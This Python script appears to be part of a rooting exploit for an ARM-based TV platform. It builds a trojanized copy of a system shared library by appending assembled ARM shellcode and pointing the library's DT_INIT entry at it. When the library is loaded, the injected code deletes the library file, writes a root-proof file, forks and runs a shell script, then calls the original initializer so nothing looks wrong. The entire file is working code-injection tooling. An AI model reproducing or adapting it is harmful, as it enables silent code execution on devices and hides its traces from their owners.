#!/usr/bin/env python3
import struct, subprocess, os, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))

def parse_elf(d):
    e_phoff = struct.unpack_from('<I', d, 28)[0]
    e_phentsize = struct.unpack_from('<H', d, 42)[0]
    e_phnum = struct.unpack_from('<H', d, 44)[0]
    ph = []
    for i in range(e_phnum):
        o = e_phoff + i*e_phentsize
        t,off,va,pa,fs,ms,fl,al = struct.unpack_from('<8I', d, o)
        ph.append(dict(type=t, off=off, va=va, fs=fs, ms=ms, fl=fl))
    return ph

def find_dyn_init(d, ph):
    for p in ph:
        if p['type'] != 2: continue
        off = p['off']
        for j in range(0, p['fs'], 8):
            tag, val = struct.unpack_from('<II', d, off+j)
            if tag == 12:
                return off+j, val
    return None, None

def gen_asm(cave, orig, selfpath, proofpath, msg, sh, script, test=False):
    mlen = len(msg.encode('latin1'))
    s = []
    s.append('    .arm\n    .syntax unified\n    .text\n    .global _start\n_start:\n')
    s.append('    push {r4-r7, r8, lr}\n')
    # unlink self first
    s.append('    adr r0, selfp\n    mov r7, #10\n    svc #0\n')
    # write proof
    s.append('    adr r0, proofp\n    movw r1, #0x241\n    movw r2, #0x1a4\n    mov r7, #5\n    svc #0\n')
    s.append('    mov r4, r0\n    cmp r4, #0\n    blt 1f\n')
    s.append('    mov r0, r4\n    adr r1, msgs\n    mov r2, #%d\n    mov r7, #4\n    svc #0\n' % mlen)
    s.append('    mov r0, r4\n    mov r7, #6\n    svc #0\n1:\n')
    # fork
    s.append('    mov r7, #2\n    svc #0\n    cmp r0, #0\n    bne 2f\n')
    # child execve
    s.append('    adr r0, shp\n    adr r1, scriptp\n    mov r2, #0\n    sub sp, sp, #12\n')
    s.append('    str r0, [sp]\n    str r1, [sp, #4]\n    str r2, [sp, #8]\n')
    s.append('    mov r1, sp\n    mov r2, #0\n    mov r7, #11\n    svc #0\n')
    s.append('    mov r0, #1\n    mov r7, #1\n    svc #0\n2:\n')
    # call original init: PC-relative BL, base-independent
    if test:
        s.append('    bl orig_stub\n')
    else:
        s.append('    bl orig_init\n')
    s.append('    pop {r4-r7, r8, pc}\n')
    s.append('here:\n    .balign 4\n')
    s.append('proofp: .asciz "%s"\n    .balign 4\n' % proofpath)
    s.append('msgs: .ascii "%s"\n    .balign 4\n' % msg.replace('\n','\\n'))
    s.append('selfp: .asciz "%s"\n    .balign 4\n' % selfpath)
    s.append('shp: .asciz "%s"\n    .balign 4\n' % sh)
    s.append('scriptp: .asciz "%s"\n    .balign 4\n' % script)
    if test:
        s.append('orig_stub:\n    bx lr\n    .balign 4\n')
    else:
        s.append('    .equ orig_init, %d\n' % orig)
    return ''.join(s)

def build(name, src, out, selfpath, proofpath, msg, test=False, orig_override=None, script='/3rd_rw/appdata/root_loop.sh'):
    d = bytearray(open(src,'rb').read())
    ph = parse_elf(d)
    rx = [p for p in ph if p['type']==1][0]
    dyn_off, orig = find_dyn_init(d, ph)
    if orig_override is not None: orig = orig_override
    if dyn_off is None: raise SystemExit('no DT_INIT')
    if rx['ms'] != rx['fs']:
        raise SystemExit('RX segment has BSS; append would collide')
    cave = len(d)
    asm = gen_asm(cave, orig, selfpath, proofpath, msg, '/bin/sh', script, test=test)
    td = tempfile.mkdtemp(prefix='pl_')
    sp = os.path.join(td,'p.s'); op = os.path.join(td,'p.o'); ep = os.path.join(td,'p.elf'); bp = os.path.join(td,'p.bin')
    open(sp,'w').write(asm)
    subprocess.run(['arm-linux-gnueabihf-as','-o',op,sp],check=True)
    subprocess.run(['arm-linux-gnueabihf-ld','-Ttext=0x%x'%cave,'-e','0','-o',ep,op],check=True)
    subprocess.run(['arm-linux-gnueabihf-objcopy','-O','binary','-j','.text',ep,bp],check=True)
    code = open(bp,'rb').read()
    oldsize = len(d)
    d += code
    newsize = len(d)
    # find the first LOAD program header file offset and extend filesz/memsz
    e_phoff = struct.unpack_from('<I', d, 28)[0]
    e_phentsize = struct.unpack_from('<H', d, 42)[0]
    e_phnum = struct.unpack_from('<H', d, 44)[0]
    patched = False
    for i in range(e_phnum):
        o = e_phoff + i*e_phentsize
        t,off,va,pa,fs,ms,fl,al = struct.unpack_from('<8I', d, o)
        if t == 1 and off == rx['off'] and va == rx['va']:
            struct.pack_into('<I', d, o+16, newsize)
            struct.pack_into('<I', d, o+20, newsize)
            patched = True
            break
    if not patched: raise SystemExit('RX program header not found')
    struct.pack_into('<I', d, dyn_off+4, cave)
    open(out,'wb').write(d)
    ph2 = parse_elf(d)
    _, o2 = find_dyn_init(d, ph2)
    print('%s: code 0x%x, cave 0x%x, orig 0x%x, size 0x%x->0x%x, INIT 0x%x, RX page end 0x%x' % (
        name, len(code), cave, orig, oldsize, newsize, o2, (newsize+0xfff)&~0xfff))

if __name__ == '__main__':
    here = os.path.dirname(os.path.abspath(__file__))
    root = os.path.abspath(os.path.join(here, '..', '..'))
    src = os.path.join(root, 'artifacts', 'tvi_original.so')
    out = os.path.join(root, 'tools', 'pub', 'libtvsysinfo.so')
    build('tvi', src, out,
          '/3rd_rw/loglevel/lib/libtvsysinfo.so',
          '/3rd_rw/root_proof.txt',
          'ROOT_EXEC_TVI\n')
    import hashlib
    h = hashlib.sha256(open(out, 'rb').read()).hexdigest()
    print('sha256', h)
    print('expected 37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a')
